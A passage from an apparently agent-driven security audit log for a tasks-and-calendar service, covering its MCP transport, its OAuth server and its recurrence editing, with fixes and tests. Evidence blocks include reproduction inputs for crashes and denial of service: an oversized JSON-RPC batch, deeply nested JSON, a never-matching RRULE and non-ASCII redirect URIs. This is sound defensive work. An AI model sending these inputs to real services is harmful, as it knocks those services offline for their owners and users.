TASK rather than a uid, `TaskGroup`'s props taking the task. `collapsedTasks` is
persisted as a uid list in settings, so it needs a migration or a
tolerate-both read. Pin it with two lists sharing a uid where only one copy has a
subtask, and assert the other row has none.

**Fixed** as described — `parentByKey`/`kidsByParent`/`kidRows`/`shownKeys` keyed
on `taskKey`, `parentOf` returning the parent TASK, `progressOf`/`childrenOf`/
`completedKids` taking a `Task`, `seen` carrying `taskKey`s, and `TaskGroup`
taking `isCollapsed(t)`/`onCollapse(t, next)` in place of a uid set.

**The observed behaviour was worse than this entry states, and the pin says so.**
It reads as "both rows show one row's subtasks" — a merge. What actually happened
first is a DROP: `byUid` was built over ALL tasks and is last-wins, so the l1
child's `parent` resolved to the **l2** copy, failed the `p.list !== t.list`
guard, and the subtask never rendered at all — invisible, and so uncompletable,
uneditable and undeletable, while the sidebar count still included it. The
same-list rule is structural now (the lookup only searches the child's own list)
rather than a whole-account lookup filtered afterwards, which is what was
discarding the row.

`collapsed_tasks` got the tolerate-both read this entry asks for, and it earned
it: a fold is honoured under EITHER spelling, the prune keeps a legacy bare uid
while any task still bears it, and new folds are written as `taskKey`. A straight
re-key would have sprung open every folded tree in every account on first load
and then written that loss back through `saveSettingsSoon`. Half-fix checked —
removing the legacy tolerance fails the migration control.

Three existing tests asserted the stored payload as bare uids. They were updated
deliberately, not made to pass: the Stage 3 pin now asserts the PROPERTY it is
about (an off-screen folded tree is not discarded) rather than the literal list,
since pinning the literal made it a test of the wire format instead.

#### [x] HEAD on a booking link 404s while GET serves the SPA, so a link checker reports the owner's published link dead

`backend/tasksd/app.py:1541` · **low** · bug

Found while widening the pin for the trailing-slash finding above, by asserting
HEAD and watching it fail on the spelling that already worked. `@app.get` builds
a FastAPI `APIRoute`, which registers `methods={"GET"}` only — Starlette's plain
`Route` adds HEAD when GET is present, and `APIRoute` does not. So
`GET /book/<token>` serves the SPA shell and `HEAD /book/<token>` falls through
to the static mount, which looks for a file called `book/<token>`, does not find
one, and answers `{"detail":"Not Found"}`.

HEAD is what link checkers, mail-security scanners and chat-app unfurlers send
first, and several treat a 404 as a dead link — which is how a published booking
link gets flagged or stripped before any human clicks it. The owner never hears
about it, the same failure mode as the trailing-slash finding.

**Fixed** by registering HEAD on both spellings — `@app.api_route(...,
methods=["GET", "HEAD"])` for the bare one and the same list on the
`add_api_route` for the trailing slash. Starlette drops the body for a HEAD
itself; only the route has to exist.

The assertion lives in the trailing-slash pin next door rather than in a new one,
because that is where the route is and the two failure shapes are the same. Half-
fixes checked: registering HEAD on the bare spelling only fails it, and widening
the route to `{token:path}` instead — a catch-all that would serve the shell for
paths no booking link can produce — fails the existing control.

**Suggested fix.** `methods=["GET", "HEAD"]` on both spellings of the booking
route (the `add_api_route` call already registers one of them, so this is one
list). Check the other explicitly-registered SPA routes for the same shape while
there. Pin it by asserting HEAD alongside GET in
`test_a_booking_link_serves_the_spa_with_or_without_a_trailing_slash`, whose
docstring currently records the gap.

Found while closing the 2026-08-19 backlog, not by a sweep. One finding, not
verified by anyone else. It is the same defect as finding 8, in the same file,
on a path that finding did not name — filed on its own rather than folded into
it, because "we fixed a bit more while we were in there" is how a defect class
stops being countable. Fixed in the same change. Now closed.

#### [x] _count_consumed's walk is unbounded for the same reason UNTIL is, so "this and following" on a never-matching COUNT rule stalls the service

`backend/tasksd/ical/edit.py:1117` · **medium** · security · stage 2

`_count_consumed` enumerates a COUNT-bounded series to work out the head's share
before a split, and the comment above its loop asserted the walk was safe:
*"finite: the rule carries COUNT"*. It is not. dateutil evaluates COUNT only
when it produces an instance — the same mechanism that makes finding 8's `UNTIL`
clamp useless — so `for occ in rr` over a rule whose BY\* parts can never be
satisfied runs to `datetime.MAXYEAR` with `consumed` still 0.

This one needs credentials, which is why it is medium and not high: it is the
"this and following" split, `PUT /api/calendars/{cal}/events/{uid}` with
`scope="following"` (or `smylte_update_event(..., scope='following')`). But the
*resource* need not be ours — any of the other CalDAV clients sharing the
collection can write the rule — the split is an ordinary owner action on it, and
it runs inside `service`'s global lock like the rest of this stage.

<details><summary>Evidence</summary>

```
Master DTSTART:20260106T090000Z, RRULE:FREQ=DAILY;COUNT=5;BYMONTH=2;BYMONTHDAY=30,
split at 2026-01-20T09:00:00+00:00 (icalendar 7.2.2, dateutil 2.9.0.post0):

  split_series(raw, "2026-01-20T09:00:00+00:00", EventEdit(summary="New"))
  -> 3.59 s          # budget neutralised in-process, i.e. the pre-fix cost
  ->    0.21 s       # with the step budget armed

The comment that made it look bounded, edit.py:1124 before the fix:

    # Finite: the rule carries COUNT.
    for occ in rr:
        if occ >= end: break
        consumed += 1
```

</details>

**Fixed** by arming the same `search_budget(_MAX_SEARCH_STEPS)` from
`tasksd/ical/rrule_budget.py` around the walk, and treating exhaustion as "the
head consumed whatever the walk found before the budget ran out" — the caller
already clamps the result to at least 1, so there is no zero to mishandle.

**Pinned by** `test_splitting_a_series_on_a_never_matching_rule_is_prompt`, with
`test_an_ordinary_count_split_still_divides_the_count` as its control, in
`backend/tests/test_backlog_aug19_stage2.py`.

## Filed during remediation — 2026-08-17

Found while closing the 2026-08-07 backlog, not by a sweep. One finding, not
verified by anyone else. Tracked as issue #57 — it came out of #48 but was its
own change, for the reason the entry gives. Now closed.

#### [x] No Content-Security-Policy anywhere, so nothing bounds what a value reaching the CSSOM can fetch

`deploy/Caddyfile.snippet` · **medium** · security

**Fixed, but NOT where this anchor points.** The policy is set by the app
(`backend/tasksd/csp.py`), not by Caddy. Two `Content-Security-Policy` headers
on one response are enforced as their intersection, so it has to be exactly one
place — and the app is the place that can hash the SPA's inline script, that
covers a direct connection to uvicorn, and that the test suite can exercise. The
Caddy snippet carries a comment saying not to add a second one. Two other
deviations from the suggested fix below: `img-src` does not allow `data:`
(nothing in the app builds one), and the policy allows `fonts.googleapis.com` /
`fonts.gstatic.com`, because 13 of the 24 Appearance font choices load from them
at runtime and a defence should not silently remove a working feature.
Self-hosting those families would let both entries go.

Cluster #48 closed the `calendar-color` beacon by validating the value at
ingest and again on the client. That is the right fix for that path, and it is
the only defence there was: there is no CSP on any response this app serves, so
ANY value that reaches a style declaration, an `img` src or a script tag can
make the browser talk to a third party, and the next such path will be
undefended in exactly the same way. The appearance allowlist and `cssColor` are
both allowlists over specific fields; a CSP is the bound over everything else.

Deliberately not fixed in that pass. The SPA carries an inline pre-paint script
in `index.html` (it has to: it applies the stored theme before first paint, and
importing a module would be too late), so a `script-src` needs a hash or a
nonce, and getting it wrong breaks the app at load rather than degrading. That
wants its own change with a real browser in front of it, not a line added to a
cluster about colors.

**Suggested fix.** Add `header` directives to the `handle { reverse_proxy 127.0.0.1:8080 }` block in
`deploy/Caddyfile.snippet`: `default-src 'self'`, `img-src 'self' data:`,
`style-src 'self' 'unsafe-inline'` (inline styles are load-bearing throughout
the SPA), `script-src 'self' 'sha256-…'` for the pre-paint script,
`connect-src 'self'`, `frame-ancestors 'none'`, `base-uri 'none'`. Pin the
script hash from a test that reads `index.html`, the way
`appearance.test.ts` already pins that script's contents, so an edit to it
cannot silently break the policy. Verify in a real browser, including the
public booking page, which is served to people who are not this account.

## Sweep — 2026-08-16

A third adversarial sweep (13 subsystem finders, two independent verifiers per
finding, 145 agents). 66 raw findings, **46 survived verification**, 20 were
refuted. Weighted toward what the earlier sweeps never saw: the remote MCP server
and its OAuth authorization server, the Windows desktop client, and the task-order
/ tasks-on-calendar / 24-hour-clock work — all added after 2026-08-08.

Every HIGH was re-verified by hand with a runnable probe before anything was
changed. **5 fixed** in that first pass (ticked below, each with a regression test
confirmed to fail against the pre-fix code), **7 more closed by Stage 1**,
**5 by Stage 2**, **7 by Stage 3**, **12 by Stage 4** and the last **9 by
Stage 5**. All 46 are closed.

### MCP OAuth authorization server

#### [x] hmac.compare_digest on attacker-controlled redirect_uri raises TypeError on non-ASCII → uncaught 500

`backend/tasksd/mcp/oauth.py:606` · **medium** · bug · `minor`

`_redirect_allowed` compares the presented redirect_uri against each registered URI with
`hmac.compare_digest(presented, candidate)`. For `str` arguments CPython raises
`TypeError: comparing strings with non-ASCII characters is not supported` unless BOTH
sides are pure ASCII. Both sides are attacker-controlled: the presented value comes
straight from `dict(request.query_params)` on the unauthenticated GET /oauth/authorize,
and the registered value comes from open dynamic client registration —
`_check_redirect_uri` (oauth.py:576-593) accepts a non-ASCII/IDN host without complaint
(verified: `_check_redirect_uri('https://exämple.com/cb')` returns it unchanged).
Nothing in routes.py catches TypeError (`authorize_form` only catches `OAuthError`, and
app.py registers no generic handler), so the request dies as a 500. The same pattern is
repeated at oauth.py:425 in `_grant_code` (`hmac.compare_digest(form.get('redirect_uri')
or '', row['redirect_uri'])`), where a non-ASCII `redirect_uri` in the token POST 500s
*after* `take_oauth_code` has already consumed the code. auth.py:202-204 documents this
exact pitfall and works around it by comparing bytes — oauth.py did not get the same
treatment.

<details><summary>Evidence</summary>

```
Reproduced against the real functions:

    >>> from tasksd.mcp.oauth import _redirect_allowed, _check_redirect_uri
    >>> _check_redirect_uri('https://exämple.com/cb')
    'https://exämple.com/cb'                      # accepted at registration
    >>> _redirect_allowed('https://claude.ai/café', ['https://claude.ai/api/mcp/auth_callback'])
    TypeError: comparing strings with non-ASCII characters is not supported
    >>> _redirect_allowed('https://claude.ai/cb', ['https://exämple.com/cb'])
    TypeError: comparing strings with non-ASCII characters is not supported

Scenario A (anonymous 500, unthrottled): attacker POSTs /oauth/register once to get a client_id, then GETs /oauth/authorize?client_id=<id>&redirect_uri=caf%C3%A9&response_type=code&code_challenge=<43ch>&code_challenge_method=S256 → 500 with a traceback in the log, repeatable without limit (GET /oauth/authorize has no `_throttle`).
Scenario B (functional break): a legitimate client registers `https://exämple.com/cb`; registration returns 201, and then every single authorization request for that client 500s forever, with no error the user can act on.
```

</details>

**Suggested fix.** Compare bytes, exactly as auth.py:204 does: `hmac.compare_digest(presented.encode(),
candidate.encode())` in `_redirect_allowed`, and
`hmac.compare_digest((form.get('redirect_uri') or '').encode(),
row['redirect_uri'].encode())` in `_grant_code`. Optionally also reject non-ASCII in
`_check_redirect_uri` so an unusable URI is refused at registration time rather than
accepted and later fatal.

#### [x] Non-string `scope` in a dynamic client registration crashes with a 500 instead of a 400

`backend/tasksd/mcp/oauth.py:207` · **low** · bug · `minor`

`register` validates the types of `redirect_uris` (list of str), `client_name`
(isinstance str) and `token_endpoint_auth_method`, but passes `body.get("scope")`
straight into `scope_set`, which does `(scope or "").split()`. A JSON body whose `scope`
is an array or an object — a realistic mistake for a DCR client, since
`grant_types`/`response_types`/`redirect_uris` in the same document ARE arrays — raises
AttributeError. `oauth_register` in routes.py:205-208 only catches `OAuthError`, so the
AttributeError escapes as a 500 rather than the `invalid_client_metadata` 400 that every
other bad-metadata path returns. Anonymous, pre-auth trigger.

<details><summary>Evidence</summary>

```
    >>> from tasksd.mcp.oauth import scope_set
    >>> scope_set(['mcp:read'])
    AttributeError: 'list' object has no attribute 'split'

Concrete request: `POST /oauth/register {"redirect_uris": ["https://claude.ai/cb"], "scope": ["mcp:read","mcp:write"]}` → 500 Internal Server Error + logged traceback, where every sibling metadata error returns `{"error":"invalid_client_metadata"}` with 400.
```

</details>

**Suggested fix.** Guard the type before parsing, e.g. `raw_scope = body.get("scope"); if raw_scope is not
None and not isinstance(raw_scope, str): raise OAuthError("invalid_client_metadata",
"scope must be a string")`, then `requested = scope_set(raw_scope) or
scope_set(DEFAULT_SCOPE)`.

#### [x] After a mistyped password the consent screen forgets which application it is for

`backend/tasksd/mcp/routes.py:266` · **low** · rendering · `minor`

On a failed password the handler re-renders with the `AuthRequest` returned by
`oauth.verify_request`, which hard-codes `client_name=""` (oauth.py:344-348 — the signed
consent blob carries `c/r/s/h/t/e` but not the name). `_consent_page` then falls back to
`req.client_name or "An application"`. So the retry page's heading becomes "Connect An
application?" and the Application row reads "An application", losing exactly the
identifying detail the code calls out as load-bearing (routes.py:515-517: "The hostname
is shown because it is the one thing that distinguishes a genuine client from one that
merely says it is Claude"). The user is asked to re-type their password on a screen that
no longer says what it is authorising. The retry response also drops the `Content-
Security-Policy` header the GET path sets (routes.py:226 vs routes.py:270), even though
the page still renders attacker-registrable content.

<details><summary>Evidence</summary>

```
oauth.py:344-348, `verify_request`:

    return AuthRequest(
        client_id=payload["c"], client_name="", redirect_uri=payload["r"], ...

routes.py:266 re-renders with that object. Reproduce with the repo's own helpers: register `client_name="Claude"`, GET /oauth/authorize → page contains `<h1>Connect Claude?</h1>`; POST the signed blob with `password="wrong"` → 401 page contains `<h1>Connect An application?</h1>` and `<span class="v">An application</span>`. `test_a_wrong_password_keeps_the_read_only_choice` (tests/test_mcp.py:791) checks the radio state on this very page but not the name.
```

</details>

**Suggested fix.** Add the client name to the signed payload (`"n": req.client_name`) in `sign_request` and
restore it in `verify_request` — it is already inside the HMAC so it stays trustworthy —
and give the retry `HTMLResponse` the same `X-Frame-Options`/`Content-Security-Policy`
headers as the GET path.

#### [x] Choosing "Read-only" on a write-only authorization request mints a token with an empty scope

`backend/tasksd/mcp/routes.py:255` · **low** · bug · `minor`

`parse_authorize` only requires `granted - {SCOPE_OFFLINE}` to be non-empty, so a
request for `scope=mcp:write offline_access` (no `mcp:read`) is valid. `_consent_page`
shows the Full/Read-only radio pair whenever `SCOPE_WRITE in scopes`, without checking
that `SCOPE_READ` is among them. If the user picks Read-only, `granted &= {SCOPE_READ,
SCOPE_OFFLINE}` reduces to `{offline_access}` (or `set()` when offline was not
requested). The flow then completes normally: a code is issued, `_issue_pair` mints an
access token with `scope="offline_access"` (plus a refresh token, since offline
survived), and the client believes it is connected — but `McpServer._call` rejects every
tool with "needs read access, which this connection was not granted", including read
tools. The user is offered a choice that silently produces a dead grant.

<details><summary>Evidence</summary>

```
routes.py:255-257:

    granted = scope_set(req.scope)
    if form.get("grant") == "read":
        granted &= {SCOPE_READ, SCOPE_OFFLINE}

Inputs: authorize with `scope="mcp:write offline_access"`; consent screen offers Read-only because SCOPE_WRITE is present; user clicks it → `granted = {"offline_access"}` → `scope_str` = "offline_access" → 200 from /oauth/token with `"scope": "offline_access"` and a refresh_token. Every subsequent `tools/call` returns METHOD/INVALID_PARAMS "… needs read access …", and there is no path to fix it except reconnecting. No test covers a request that omits `mcp:read`.
```

</details>

**Suggested fix.** Only render the Read-only choice when `SCOPE_READ in scopes`, and in `authorize_submit`
refuse (or ignore) the narrowing when it would leave `granted - {SCOPE_OFFLINE}` empty —
e.g. `narrowed = granted & {SCOPE_READ, SCOPE_OFFLINE}` applied only `if narrowed -
{SCOPE_OFFLINE}`.

### MCP transport

#### [x] A JSON-RPC batch is unbounded: one 1 MB POST /mcp becomes thousands of serialized service calls and a multi-gigabyte response

`backend/tasksd/mcp/server.py:228` · **medium** · security

`run_batch` accepts a JSON array of any length and executes every element, and the only
size bound anywhere is `_MAX_RPC_BYTES = 1_000_000` on the *request*. `MAX_RESULT_CHARS`
(400 000) is enforced per message inside `_call`, never across the batch, and it only
measures the `content` text block — `structuredContent` carries the same payload a
second time and is unmeasured. Nothing caps the number of messages, the cumulative
output, or the wall-clock time, and the whole batch runs inside a single
`asyncio.to_thread` call that cannot be cancelled when the client disconnects. Each tool
handler re-acquires `TaskService._lock`, the process-wide lock every web-UI request and
the background sync also serialise on, so a long batch also freezes the rest of the app.
The hardening commit added the request cap and explicitly reasoned that it was "generous
enough for a large batch" — the batch itself was never bounded.

<details><summary>Evidence</summary>

```
backend/tasksd/mcp/server.py:224-229

    if isinstance(payload, list):
        if not payload:
            return {..."empty batch"}
        out = [r for r in (server.handle(m, scopes=scopes) for m in payload) if r is not None]
        return out or None

and backend/tasksd/mcp/routes.py:402-420, where the only bound is the 1 MB read and the result is handed straight to `JSONResponse(out)`.

Concrete failure: a client holding any mcp:read token POSTs a single ~1 MB array of
  {"jsonrpc":"2.0","id":N,"method":"tools/call","params":{"name":"smylte_list_events","arguments":{"start":"2026-01-01","end":"2026-12-01","limit":500}}}
At ~150 bytes per element that is ~6 600 calls. `page()` caps each result at MAX_LIMIT=500 event DTOs (~600 bytes each -> ~300 KB of text, under the 400 000-char per-message cap) and `structuredContent` duplicates it, so each result is ~600 KB. `out` therefore holds ~3.3 M dicts and `JSONResponse(out)` renders ~4 GB of bytes in one `json.dumps` — the process is OOM-killed, taking the web UI and the public booking pages with it. The write-scope variant is worse for availability rather than memory: ~9 000 `smylte_create_task` calls each perform a CalDAV PUT under the global service lock, so one request holds the app unresponsive for minutes with no way to cancel it.
```

</details>

**Suggested fix.** Bound the batch in `run_batch`: reject a list longer than a small constant (e.g. 100)
with a single INVALID_REQUEST error, and accumulate the serialized size of the results,
aborting the batch with an error once a cumulative cap is crossed. Measure
`structuredContent` as well as `content` against `MAX_RESULT_CHARS`, or drop
`structuredContent` once the text form is near the cap.

#### [x] Deeply nested JSON at POST /mcp raises RecursionError, which the parse guard does not catch — the request 500s instead of returning -32700

`backend/tasksd/mcp/routes.py:405` · **low** · bug · `minor`

`parse_body` calls `json.loads`, whose C scanner raises `RecursionError` (a
`RuntimeError` subclass) rather than `ValueError` when the nesting depth exceeds the
interpreter limit. The handler only catches `(ValueError, UnicodeDecodeError)`, so the
exception escapes the route and Starlette returns a generic 500 with a full traceback in
the log. The sibling endpoint `/oauth/register` catches this correctly with a bare
`except Exception` (routes.py:198-202), so the transport is the one place the guard is
incomplete — exactly the kind of gap the 'harden against a hostile client' pass was
meant to close.

<details><summary>Evidence</summary>

```
backend/tasksd/mcp/routes.py:403-410

        try:
            payload = parse_body(raw)
        except (ValueError, UnicodeDecodeError):
            return JSONResponse(
                {"jsonrpc": "2.0", "id": None,
                 "error": {"code": -32700, "message": "invalid JSON"}},
                status_code=400,
            )

Verified against CPython: json.loads(b'[' * 100000 + b']' * 100000) raises
  RecursionError: maximum recursion depth exceeded while decoding a JSON array from a unicode string

Concrete failure: a client with a valid bearer token POSTs a 200 KB body of `[[[[...]]]]` (well under the 1 MB cap). Expected: 400 with JSON-RPC error -32700. Actual: 500 Internal Server Error plus a logged traceback, repeatable on demand.
```

</details>

**Suggested fix.** Add `RecursionError` to the except tuple (or use `except Exception` as `/oauth/register`
does) so the malformed body maps to the -32700 parse error the protocol defines.

#### [x] After a mistyped password the consent screen stops naming the application it is about to authorize

`backend/tasksd/mcp/routes.py:266` · **low** · rendering · `minor`

`OAuthServer.sign_request` does not put `client_name` in the signed consent blob, and
`verify_request` therefore reconstructs the `AuthRequest` with `client_name=""`. The GET
render gets the real name from `parse_authorize` (which read the client row), but the
POST error re-render passes that name-less `AuthRequest` back into `_consent_page`,
where `req.client_name or "An application"` falls through to the placeholder. The page's
own stated purpose — and the reason the hardening commit reworked this exact call site —
is to let the owner see who is asking before typing a password, and the redirect host
beside it is still shown, so the screen looks intact while the identifying half has
silently degraded.

<details><summary>Evidence</summary>

```
backend/tasksd/mcp/oauth.py:344-348 (verify_request)

        return AuthRequest(
            client_id=payload["c"], client_name="", redirect_uri=payload["r"],
            ...

backend/tasksd/mcp/routes.py:260-271 uses that object:

                _consent_page(req, form.get("request", ""), issuer=issuer,
                              grant=form.get("grant") or "full",
                              error="That username or password was not right."),

backend/tasksd/mcp/routes.py:518:  name = html.escape(req.client_name or "An application")

Concrete failure: owner starts a connection from Claude. GET /oauth/authorize renders 'Connect Claude?' with 'Application: Claude'. They mistype the password; the 401 re-render shows 'Connect An application?' with 'Application: An application' — same form, same signed blob, name gone. `test_a_wrong_password_keeps_the_read_only_choice` (tests/test_mcp.py:791) exercises this exact response and asserts only the radio state, so nothing catches it.
```

</details>

**Suggested fix.** Carry the name in the signed payload — add `"n": req.client_name` in `sign_request` and
read it back with `payload.get("n", "")` in `verify_request` (the `.get` keeps blobs
signed before the change working), or re-read the client row by `client_id` on the error
path.

#### [x] Cancelling the consent screen burns the password-guess budget, so eight declines lock the owner out of connecting for 15 minutes

`backend/tasksd/mcp/routes.py:234` · **low** · bug · `minor`

The hardening commit moved `_throttle(request, consent_limiter)` from just before the
password check to the top of `authorize_submit`, so every POST now reserves a slot in a
limiter configured `max_fails=8, lockout_s=900`. Two of the four exits — 'deny' and 'the
signed form expired' — return before `consent_limiter.record_success(...)` at line 272,
so they leave the reservation standing even though no password was ever evaluated. Both
are ordinary things a legitimate owner does, and both are gated on a signed blob this
server issued, so neither is the abuse the limiter exists for.

<details><summary>Evidence</summary>

```
backend/tasksd/mcp/routes.py:229-272

        _throttle(request, consent_limiter)          # reserves a slot
        form = await _form(request)
        try:
            req = oauth.verify_request(form.get("request", ""))
        except OAuthError as exc:
            return HTMLResponse(_notice_page("That sign-in form expired", ...), 400)   # no record_success

        if form.get("action") != "approve":
            return RedirectResponse(... "error": "access_denied" ...)                   # no record_success
        ...
        consent_limiter.record_success(limiter_key(client_ip(request)))

RateLimiter.attempt (backend/tasksd/auth.py:145-159) locks the key for `lockout_s` once `len(recent) >= max_fails`.

Concrete failure: the owner is setting up a connector, opens the consent page and clicks Cancel (or lets the 600 s form expire) eight times across a fumbled setup. The ninth POST — and every GET-then-POST for the next 15 minutes — returns 429 'too many requests, try later', with no wrong password ever entered. The pre-hardening ordering counted only actual password checks.
```

</details>

**Suggested fix.** Keep `attempt()` first (the body read must stay throttled), but call
`consent_limiter.record_success(limiter_key(client_ip(request)))` on the deny path,
since `verify_request` has already proved the POST carries a blob this server issued.

#### [x] No test sends a JSON-RPC batch, so the entire batch-framing path in run_batch is uncovered

`backend/tests/test_mcp.py:259` · **low** · test-gap · `minor`

`run_batch` has four distinct behaviours — empty array -> INVALID_REQUEST object, mixed
array -> array of only the non-None replies, all-notification array -> None (which the
transport turns into a bare 202), non-array/non-object -> INVALID_REQUEST — and
`test_mcp.py` never posts an array at all. Every `_rpc`/`_call` helper sends a single
object. This is the fragile part of the transport (it decides 200-with-body vs 202-with-
no-body, and it is the amplification vector in the unbounded-batch finding above), and a
regression such as returning `[]` instead of `None` for an all-notification batch would
send `200 []` and break clients with nothing failing in CI. `handle`'s malformed-message
paths (non-dict element, wrong `jsonrpc` version, notification naming an unknown method)
are uncovered for the same reason, as is the -32700 branch at routes.py:405 — no test
posts invalid JSON to /mcp.

<details><summary>Evidence</summary>

```
backend/tasksd/mcp/server.py:217-233 is the untested code. The closest test is

    def test_notifications_get_202_and_no_body(mcp):
        token = _connect(mcp)["access_token"]
        r = mcp.post("/mcp", json={"jsonrpc": "2.0", "method": "notifications/initialized"}, ...)
        assert r.status_code == 202 and not r.content

which sends a single object, taking the `isinstance(payload, dict)` branch. Grepping the file for a list body finds none: every call goes through `_rpc` (line 106) or a raw `json={...}` object.
```

</details>

**Suggested fix.** Add a batch test covering: `[]` -> 400/-32600; `[request, notification, request]` -> 200
with exactly two result objects whose ids match; `[notification, notification]` -> 202
with an empty body; a non-array non-object payload (`"hello"`, `5`) -> INVALID_REQUEST;
and a malformed-JSON body -> 400 with code -32700.

### MCP tools

#### [x] Every write tool reports "the calendar server may be unreachable" for an unknown uid — the ToolError guards in api.py are unreachable dead code

`backend/tasksd/mcp/api.py:257` · **medium** · bug · `minor`

`McpApi.update_task`, `complete_task`, `cancel_task`, `update_event` and `move_event`
each call into `TaskService` and then check `if <result> is None: raise ToolError("No
task ... in list ...")`. That branch can never execute: `SyncEngine._edit`
(engine.py:414-417) raises `KeyError(f"unknown {kind} {uid} in {collection_href}")` when
the cached row is missing, and `split_event`/`move_event` raise `KeyError` directly, so
the service never returns `None` for a missing uid. `KeyError` is not `ValueError`, so
`update_event`'s `except ValueError` (api.py:406) does not catch it either. It
propagates to `McpServer._call`'s blanket `except Exception` (server.py:178-183), which
answers with `"<tool> could not be completed (KeyError). The calendar server may be
unreachable; try again shortly."` The HTTP surface maps exactly this to a 404 with the
real message (`@app.exception_handler(KeyError)`, app.py:757-763); the MCP surface has
no equivalent, so the module's stated contract — "Errors are answers, not exceptions"
(tools.py:15-18) — is broken on the single most common client mistake. The advice is not
merely useless, it is wrong: it tells the model the backend is down and to retry, which
it will do forever against a uid that does not exist. The same blanket path swallows
`ConflictError` (a concurrent write from another CalDAV client, mapped to 409 "retry the
change" over HTTP) and `ical.NotEditable` on task edits (api.update_task has no `except
ValueError` at all, unlike update_event).

<details><summary>Evidence</summary>

```
api.py:257-259
    task = self._svc.edit_task(href, uid, TaskEdit(**kw))
    if task is None:
        raise ToolError(f"No task {uid!r} in list {list_id!r}.")

engine.py:414-417
    def _edit(self, collection_href, uid, apply_fn, edit, *, kind):
        row = store.get_item(self.conn, collection_href, uid)
        if row is None:
            raise KeyError(f"unknown {kind} {uid} in {collection_href}")

Failure scenario: a list `groceries` exists, task `abc@tasksd` does not.
  tools/call smylte_update_task {"list_id":"groceries","uid":"abc@tasksd","summary":"x"}
  -> KeyError escapes api.update_task (no ValueError wrapper) and edit_task
  -> server.py:178 generic handler
  -> {"isError": true, "content":[{"text":"smylte_update_task could not be completed (KeyError). The calendar server may be unreachable; try again shortly."}]}
Expected (and what the dead branch at api.py:258 was written to say): "No task 'abc@tasksd' in list 'groceries'."
Identical for smylte_complete_task, smylte_cancel_task (both route through edit_task), smylte_update_event (KeyError is not ValueError) and smylte_move_event.
```

</details>

**Suggested fix.** Catch `KeyError` where the None-guards currently sit — e.g. in `McpApi`, wrap each
`self._svc.*` write call in `try/except KeyError` and re-raise the ToolError sentence
the dead branch already contains; or add `except KeyError as exc: return
self._tool_failure(...)` plus a `ConflictError` arm in `McpServer._call` so a stale-
cache conflict says "someone else changed this; re-read it and try again" rather than
"the calendar server may be unreachable". Add a test asserting
smylte_update_task/smylte_update_event against a bogus uid returns the "No task/event
..." sentence.

#### [x] smylte_delete_task and smylte_delete_event confirm `{"deleted": uid}` for a uid that does not exist or lives in a different list

`backend/tasksd/mcp/tools.py:325` · **medium** · bug · `minor`

Both delete handlers call the API and then unconditionally return a success payload
naming the uid. `SyncEngine.delete_task` (engine.py:446-449) — which serves both
`TaskService.delete_task` and `TaskService.delete_event` with scope='all'
(service.py:555) — returns silently when `store.get_item(conn, collection_href, uid)` is
None. The cache lookup is scoped to the collection, so both a nonexistent uid and a uid
that lives in a *different* list hit that early return.
`McpApi.delete_task`/`delete_event` add no existence check, so the tool answers
`isError: false` with `{"deleted": "<uid>"}` and the service even publishes a spurious
`task_deleted`/`event_deleted` SSE event to every open browser tab. This is the one tool
class where a false success is unrecoverable in the conversation: every other tool in
the file (get_task, update_task, complete_task, cancel_task, get_event, update_event,
move_event, update_booking_link, and delete_list via `_href`) raises a ToolError when
the target is missing — delete is the exception, and it is the one where the model will
report "done" to the user and stop.

<details><summary>Evidence</summary>

```
tools.py:323-325
    def _delete_task(list_id, uid):
        api.delete_task(list_id, uid)
        return {"deleted": uid}

tools.py:482-484
    def _delete_event(calendar_id, uid, recurrence_id=None, scope="all"):
        api.delete_event(calendar_id, uid, recurrence_id=recurrence_id, scope=scope)
        return {"deleted": uid, "scope": scope}

api.py:274-275
    def delete_task(self, list_id, uid):
        self._svc.delete_task(self._href(list_id), uid)   # no existence check

engine.py:446-449
    def delete_task(self, collection_href, uid):
        row = store.get_item(self.conn, collection_href, uid)
        if row is None:
            return                      # <- silent no-op

Failure scenario: task "Renew passport" (uid p1@tasksd) lives in list `personal`; the model has both `work` and `personal` in context.
  tools/call smylte_delete_task {"list_id":"work","uid":"p1@tasksd"}
  -> store.get_item('/…/work/','p1@tasksd') is None -> engine returns
  -> service publishes {"type":"task_deleted", ...} to open tabs
  -> result {"isError": false, "structuredContent": {"deleted":"p1@tasksd"}}
The model tells the user the task is deleted. It is still in `personal`, and still in Tasks.org/DAVx5. Same for smylte_delete_event with any uid not on the named calendar.
```

</details>

**Suggested fix.** In `McpApi.delete_task` / `delete_event`, confirm the target first and raise ToolError
otherwise — `if not self._svc.has_task(href, uid): raise ToolError(f"No task {uid!r} in
list {list_id!r}.")`, and for events `if self._svc.get_event(href, uid) is None: raise
ToolError(...)`. Add a regression test that deleting an unknown uid comes back with
isError true.

#### [x] smylte_list_tasks across all lists is concatenated per-list and never sorted, so `limit` returns an arbitrary subset while the description promises due-date order

`backend/tasksd/mcp/api.py:168` · **medium** · bug · `minor`

`McpApi.list_tasks` builds its result by extending one list's rows after another.
`TaskService.list_tasks` sorts *within* a collection (service.py:193-199, by sort_order
→ due → summary), but nothing re-sorts the concatenation, and `page()`
(tools.py:131-140) then slices the head of that per-list ordering. The sibling
`list_events` does sort globally (api.py:304), which is what makes this an oversight
rather than a design choice. The tool's own description tells the model the opposite:
"Tasks in one list, or across every list when list_id is omitted. Ordered the way the
app shows them: manual position first, then due date (undated last), then priority, then
title." Priority is in no sort key anywhere in the code path, and due-date order holds
only inside a single list. Because every list tool is paginated at DEFAULT_LIMIT=50, the
model's first (and usually only) page is whichever lists happen to come first in
`store.get_collections` order.

<details><summary>Evidence</summary>

```
api.py:167-170
    rows: list[dict] = []
    for href in self._task_lists(list_id):
        rows.extend(self._svc.list_tasks(href, include_done=True))
(no rows.sort(...) anywhere before `return out` at api.py:187)

contrast api.py:304 in list_events:
    rows.sort(key=lambda r: (r.get("start") or "", r.get("summary") or ""))

tools.py:210-213 (the advertised contract)
    "Tasks in one list, or across every list when list_id is omitted. "
    "Ordered the way the app shows them: manual position first, then due "
    "date (undated last), then priority, then title."

Failure scenario: list `work` (60 open tasks, all due 2027-xx) sorts before list `personal` (3 tasks due tomorrow) in get_collections order.
  tools/call smylte_list_tasks {}            # no list_id, default limit 50
  -> rows = 60 work tasks + 3 personal tasks, in that order
  -> page() returns rows[0:50] = 50 work tasks, total=63, has_more=true
The model answering "what's due next?" from that page reports 2027 deadlines and never sees tomorrow's three. Adding due_before doesn't help either: the filter is applied before the same unsorted slice.
```

</details>

**Suggested fix.** Sort the merged result before returning, mirroring list_events and the documented order,
e.g. `out.sort(key=lambda t: (t["sort_order"] is None, t["sort_order"] or 0.0, t["due"]
